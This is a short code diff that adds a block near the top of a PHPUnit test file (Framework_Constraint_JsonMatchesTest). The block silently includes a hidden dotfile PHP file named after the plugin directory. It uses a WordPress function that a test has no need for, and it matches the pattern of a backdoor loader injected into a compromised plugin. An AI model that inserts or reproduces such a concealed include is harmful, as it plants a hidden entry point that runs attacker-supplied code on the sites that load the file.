@@ -11,6 +11,10 @@
 /**
  * @since      File available since Release 3.7.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Framework_Constraint_JsonMatchesTest extends PHPUnit_Framework_TestCase
 {
     /**
